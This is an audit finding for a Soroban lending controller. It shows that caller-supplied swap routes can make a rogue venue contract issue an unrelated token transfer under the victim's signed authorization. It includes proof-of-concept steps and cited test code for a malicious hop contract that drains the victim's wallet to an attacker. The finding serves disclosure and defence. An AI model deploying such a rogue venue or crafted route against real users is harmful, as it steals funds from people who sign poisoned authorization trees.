### Title
Crafted swap route executes attacker-chosen token transfers under the caller’s authorization - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral`, `swap_debt`, `multiply`, and `repay_debt_with_collateral` accept opaque route bytes and execute them through the configured router inside a caller-authorized transaction. Because route venues are not constrained by the controller and nested calls remain beneath the caller’s root authorization, a crafted route can include a venue that requests an unrelated `token.transfer` from the victim. If the victim signs the authorization tree returned by simulation, the transfer drains wallet funds unrelated to the protocol swap.

### Finding Description
The strategy entrypoint authenticates the top-level caller and verifies ownership or delegation for the target account. `swap_collateral` then withdraws the selected collateral and forwards the caller-supplied `swap` bytes to the router through `swap_tokens_or_passthrough` [1](#0-0) . `swap_tokens` authorizes only the controller’s exact input transfer, but executes the opaque route inside the same transaction [2](#0-1) . The measured-output checks only bound the controller’s input spend and require positive output; they do not restrict additional calls made by the route or additional authorizations demanded from the caller [3](#0-2) . Soroban records such nested authorization requirements under the caller’s root `swap_collateral` authorization, so an unrelated transfer requested by a route-selected venue can be included in the signed tree [4](#0-3) .

### Impact Explanation
This can steal any token for which the victim can authorize a transfer, not merely the collateral being swapped. The malicious venue returns a valid swap result, allowing the lending operation and final risk checks to pass, while its nested `transfer` moves unrelated wallet tokens to the attacker [5](#0-4) . The signed authorization tree makes the theft atomic with the victim’s lending operation.

### Likelihood Explanation
A route payload is caller-controlled input to the reachable strategy verbs. The victim must sign the exact tree containing the extra child transfer, so exploitation depends on a wallet or client presenting a malicious route and the victim approving its simulated authorization tree. Honest simulation does not hide the extra invocation; the weakness is that the protocol permits route-selected code to demand it [6](#0-5) . This makes the attack practical through malicious quote/route construction but not unilateral against an arbitrary user who never signs the poisoned tree.

### Recommendation
Constrain route execution so strategy calls cannot introduce caller authorization requirements beyond the expected controller input transfer. Prefer a router/venue allowlist or a route format that can only invoke reviewed venue adapters. Clients must additionally decode `swap` bytes and reject any authorization tree containing children other than the expected input transfer.

### Proof of Concept
1. Deploy a hop contract whose `swap()` invokes `token::Client::transfer(victim, attacker, victim_wallet_balance)`.
2. Construct route bytes that cause the configured router to invoke that hop contract while still paying a sufficient `token_out` amount.
3. Have the victim invoke:
   `swap_collateral(caller=victim, account_id=victim_account, current=USDC HubAssetKey, amount=swap_amount, new=ETH HubAssetKey, swap=crafted_route)`.
4. Simulation records an authorization tree rooted at `swap_collateral` and containing a child `wallet_token.transfer(victim, attacker, victim_wallet_balance)`.
5. If the victim signs that tree, the nested transfer succeeds, the victim’s unrelated wallet balance becomes zero, and the attacker receives the tokens [7](#0-6) .

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
